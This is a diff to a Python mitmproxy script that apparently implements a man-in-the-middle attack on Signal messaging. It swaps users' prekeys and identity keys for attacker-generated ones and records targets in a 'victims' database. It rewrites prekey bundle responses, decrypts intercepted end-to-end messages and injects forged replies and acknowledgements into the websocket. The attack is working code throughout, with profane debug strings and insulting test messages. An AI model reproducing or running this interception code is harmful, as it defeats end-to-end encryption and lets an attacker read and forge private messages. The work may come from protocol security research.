@@ -2,6 +2,7 @@ import subprocess
 import os
 import json
 import requests
+import random
 from mitmproxy import flow, http, ctx
 import sqlite3
 from setup import setup_db
@@ -13,9 +14,10 @@ from proto_python.storage_pb2 import *
 from proto_python.WebSocketResources_pb2 import *
 from proto_python.SignalService_pb2 import *
 from proto_python import *
-from test_protocol import *
+from test_protocol_wip import *
 
 protocol_runs = dict()
+once = False
 
 def try_run_sudo(cmd):
     try_run(f"sudo {cmd}")
@@ -44,7 +46,7 @@ def fake_key_gen(preKeysId=1, signedKeyId=1):
 
     keys = json.loads(out)
 
-    identity_key = (keys["identityKey"]["privateKey"], keys["identityKey"]["publicKey"])
+    identity_key = {"privateKey":keys["identityKey"]["privateKey"], "publicKey":keys["identityKey"]["publicKey"]}
     signedPre_key = (
         keys["signedPreKey"]["privateKey"],
         keys["signedPreKey"]["publicKey"],
@@ -133,7 +135,7 @@ def request(flow: http.HTTPFlow):
         # pNumber, aci, pni = info["number"], info["uuid"], info["pni"]
 
         IdenKey, SignedPreKey, PreKeys = (
-            keys["identityKey"],
+            json.dumps(keys["identityKey"]),
             json.dumps(keys["signedPreKey"]),
             json.dumps(keys["preKeys"]),
         )
@@ -142,7 +144,14 @@ def request(flow: http.HTTPFlow):
             signedKeyId=keys["signedPreKey"]["keyId"],
             preKeysId=keys["preKeys"][0]["keyId"],
         )
-        # fake_pni_keys = fake_key_gen()
+        ctx.log.warn(fake_keys)
+                
+        fake_IdenKeyDict, fake_SignedPreKeyDict, fake_PreKeysDict = (
+            (fake_keys["identityKey"]),
+            (fake_keys["signedPreKey"]),
+            (fake_keys["preKeys"]),
+        )
+        
         fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
             json.dumps(fake_keys["identityKey"]),
             json.dumps(fake_keys["signedPreKey"]),
@@ -167,6 +176,10 @@ def request(flow: http.HTTPFlow):
         conn.commit()
         ctx.log.info(f"Updated {identity} keys for target {target}")
         # keys["preKeys"] = fa["preKeys"]
+        fake_keys["identityKey"] = fake_keys["identityKey"]["publicKey"]
+        del fake_keys["signedPreKey"]["privateKey"]
+        for i in range(len(fake_keys)):
+            del fake_keys["preKeys"][i]["privateKey"]
         flow.request.content = json.dumps(fake_keys).encode()
         with open(f"saved/fake-{ts}-{identity}-keys.json", "wb") as f:
             f.write(flow.request.content)
@@ -238,7 +251,7 @@ def response(flow: http.HTTPFlow):
                 "SELECT aci FROM victims WHERE UnidentifiedAccessKey LIKE ? ", (bearer,)
             )
             #target = res.fetchone()[0]
-        ctx.log.warn(flow)
+        ctx.log.warn(flow.response.content)
 
         devices=None
         try :
@@ -247,7 +260,7 @@ def response(flow: http.HTTPFlow):
             ctx.log.debug("No info about devices")
             return
         
-        for device in devices:
+        for i, device in enumerate(devices):
             # ctx.log(params)
             fake_keys = fake_key_gen(
                 preKeysId=device["preKey"]["keyId"],
@@ -281,16 +294,30 @@ def response(flow: http.HTTPFlow):
             # res = cur.execute("SELECT * from end2end")
             # ctx.log(res.fetchall())
             conn.commit()
-
+            
+            info['devices'][i]['signedPreKey']['publicKey'] = json.loads(fake_SignedPreKey)["publicKey"]
+            info['devices'][i]['signedPreKey']['signature'] = json.loads(fake_SignedPreKey)["signature"]
+            fake_PreKeys = json.loads(fake_PreKeys)
+            keyId = info['devices'][i]['preKey']['keyId']
+            ctx.log.error(info['devices'])
+            info['devices'][i]['preKey']['publicKey'] = fake_PreKeys[0]['publicKey']
+            info['identityKey'] = json.loads(fake_IdenKey)['publicKey']
+        ctx.log.warn(info)
+        flow.response.set_content(bytes(json.dumps(info),'utf-8'))
 
 def websocket_message(flow: http.HTTPFlow):
     cont = flow.websocket.messages
     conn = sqlite3.connect("mitm.db")
     cur  = conn.cursor()
-    for messages in cont:
-        ctx.log.warn(messages)
+    msg = b''
+    once = False
+    ctx.log(f"cont len {len(cont)}")
+    # for messages in cont:
+    messages = cont[-1]
+    if True:
+        #ctx.log.warn(messages)
         ctx.log(messages.content)
-        pattern = b"/v1/messages"
+        pattern = b"/v1/messages"   
         proto_msg = WebSocketMessage()
 
         if pattern in messages.content:
@@ -300,41 +327,117 @@ def websocket_message(flow: http.HTTPFlow):
             ctx.log.alert(proto_msg)
             ctx.log.warn(f"diocane {proto_msg}")
             body = json.loads(proto_msg.request.body)
-            ctx.log.warn(body)
+            #ctx.log.warn(body)
             
             ##### Protocol Run?
             recv = body['destination']
             
             # check if protocol is available
-            
-            ### try to x3dh if contact never seen before
-            aliceToMitm = {}.fromkeys(["recv_IdenKey", "recv_SignedPreKey", "recv_PreKey", "recv_FakeIdenKey", "recv_FakeSignedPreKey", "recv_FakePreKey"])
-            aliceToMitmKeys = cur.execute(f"SELECT recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey FROM end2end WHERE recv_aci = ? AND deviceId = 1;", (recv,)).fetchone()
-            #print((aliceToMitmKeys))
-            
-            mitmToBobKeys = cur.execute(f"SELECT aciIdenKey, aciSignedPreKey, aciPreKeys, aciFakeIdenKey, aciFakeSignedPreKey, aciFakePreKeys FROM victims WHERE aci = ?", (sourceUUid,)).fetchone() 
-            ctx.log.warn(mitmToBobKeys)
-            #result = cur.execute(query, params).fetchall()
-            uuidUser = Alice(pubIK=aliceToMitmKeys[0])
-
-            EncodedMessage = base64.b64decode(body['messages'][0]['content'])
             type = body['messages'][0]['type'] #check out for creating instances of protocol
-            firstByte, protoMessage = EncodedMessage[1], EncodedMessage[1:]
+            if (type == 3):
+            ### try to x3dh if contact never seen before
+                #aliceToMitm = {}.fromkeys(["recv_IdenKey", "recv_SignedPreKey", "recv_PreKey", "recv_FakeIdenKey", "recv_FakeSignedPreKey", "recv_FakePreKey"])
+                aliceToMitmKeys = cur.execute(f"SELECT recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey FROM end2end WHERE recv_aci = ? AND deviceId = 1;", (recv,)).fetchone()
+                #print((aliceToMitmKeys))
             
-            
-            
-            ## TODO: check if message is PrekeySignal or  SignalMessage
-            atm = AliceToMitm(bob = mitmA)
-            dec_msg = atm.BobReceive(EncodedMessage)
-            print(dec_msg)
+                mitmToALiceKeys = cur.execute(f"SELECT aciIdenKey, aciSignedPreKey, aciPreKeys, aciFakeIdenKey, aciFakeSignedPreKey, aciFakePreKeys FROM victims WHERE aci = ?", (sourceUUid,)).fetchone() 
+                #ctx.log.warn(mitmToBobKeys)
+                #result = cur.execute(query, params).fetchall()
+                mitmAIK, mitmASPK, mitmOTK = json.loads(aliceToMitmKeys[3])["privateKey"], json.loads(aliceToMitmKeys[4])["privateKey"],json.loads(aliceToMitmKeys[5])
+                #ctx.log.error(f" porcodioooo{(base64.b64decode(mitmAIK).hex(), base64.b64decode(mitmASPK).hex(), base64.b64decode(mitmOTK[0]['privateKey']).hex())}")
+                mitmA = Bob(privIK = hex2PrivKey(base64.b64decode(mitmAIK).hex()), privSPK = hex2PrivKey(base64.b64decode(mitmASPK).hex()), privOPK = hex2PrivKey(base64.b64decode(mitmOTK[0]['privateKey']).hex()))
+
+                #ctx.log.error((mitmAIK, mitmOTK, mitmASPK))
+                EncodedMessage = body['messages'][0]['content']
+                ctx.log.warn(EncodedMessage)
+                atm = AliceToMitm(bob = mitmA)
+                dec_msg = atm.BobReceive(EncodedMessage)
+                ctx.log.error(f"decrypted message {dec_msg}")
+                
+                ############# COMPLETE HERE Mitm send to Bob
+                # mitmB.x3dh(bob_bundle)
+                # bob.x3dh(mitmB_bundle)
+                # mitmToBob = MitmToBob(alice = mitmB, bob = bob)
+                # msg_to_bob = mitmToBob.AliceSendSignalMessage(b"hey bob, you are dumb")
+                print("")
+                    
+                msg = atm.BobSend(b"fuck you alice", b'bob profile key')
+                #\msg = base64.b64decode(msg)
+                response = WebSocketMessage()
+                response.CopyFrom(proto_msg)
+                # response_body  = json.loads(response.request.body)
+                # response_body['destination'] = sourceUUid
+                # response_body['messages'][0]['type'] = 6
+                
+                
+                # response_body['messages'][0]['content'] = msg
+                # ctx.log.warn((response_body,msg))
+                
+                # response.request.body = bytes(json.dumps(response_body), 'utf-8')
+                # #response.request.body = json.dumps(response_body)
+
+                # #wire_response = response.SerializeToString()
+                # ctx.log.warn(f"response {response_body}")
+                # res = WebSocketRequestMessage()
+                response.request.verb = "PUT"
+                response.request.path = "/api/v1/message"
+                seed = current_milli_time()
+                response.request.id = abs(nextLong(seed))
+                response.request.headers.append(f"content-type:application/json")
+                response.request.headers.append(f"X-Signal-Key: false")
+                response.request.headers.append(f"X-Signal-Timestamp: {current_milli_time()}")
+                responseEnvelope = Envelope()
+                responseEnvelope.type = 1
+                responseEnvelope.timestamp = current_milli_time()
+                responseEnvelope.serverGuid = "ef5d1433-c2df-4aeb-9863-5b88666f659b"
+                responseEnvelope.sourceUuid = recv
+                responseEnvelope.sourceDevice = 1
+                responseEnvelope.serverTimestamp = current_milli_time()
+                responseEnvelope.destinationUuid = sourceUUid
+                responseEnvelope.urgent = True
+                responseEnvelope.story = False
+                responseEnvelope.content = msg # base64.b64decode(msg)
+                ctx.log.warn(f"msg { msg.hex()}")
+                
+                response.request.body = responseEnvelope.SerializeToString()
+                
+                ack = WebSocketMessage()
+                ack.ParseFromString(bytes.fromhex("08021a5808f9b4e6cce8a0f4a26f10c8011a024f4b22137b226e6565647353796e63223a66616c73657d2a1d436f6e74656e742d547970653a6170706c69636174696f6e2f6a736f6e2a11436f6e74656e742d4c656e6774683a3139"))
+                ack.response.id = proto_msg.request.id
+                ctx.log.error(ack.response.id)
+                ack_wire = ack.SerializeToString()
+                last_message = flow.websocket.messages[-1]
+                if not once:
+                    ctx.master.commands.call("inject.websocket",
+                                            flow,
+                                            last_message.from_client,
+                                            ack_wire,
+                                            False)
+                
+                wire_response = response.SerializeToString()
+                ctx.log.warn(f"wire_response {wire_response}")
+                #ctx.log.warn(f"response {response}")
+                if not once:
+                    ctx.master.commands.call("inject.websocket",
+                                            flow,
+                                            last_message.from_client,
+                                            wire_response,
+                                            False)
+                    once = True
+                
+            ## TODO: check if message is PrekeySignal or  SignalMessageq
+            # atm = AliceToMitm(bob = mitmA)
+            # dec_msg = atm.BobReceive(EncodedMessage)
+            # print(dec_msg)
             
             ############# COMPLETE HERE Mitm send to Bob
-            mitmB.x3dh(bob_bundle)
-            bob.x3dh(mitmB_bundle)
-            mitmToBob = MitmToBob(alice = mitmB, bob = bob)
-            msg_to_bob = mitmToBob.AliceSendSignalMessage(b"hey bob, you are dumb")
+            # mitmB.x3dh(bob_bundle)
+            # bob.x3dh(mitmB_bundle)
+            # mitmToBob = MitmToBob(alice = mitmB, bob = bob)
+            # msg_to_bob = mitmToBob.AliceSendSignalMessage(b"hey bob, you are dumb")
             
             
                 # other 
 #        cur.execute("CREATE TABLE end2end(v_aci, recv_aci, deviceId,recv_IdenKey, recv_SignedPreKey, \
 #            recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey, PRIMARY KEY (pNumber, aci, pni));")
+
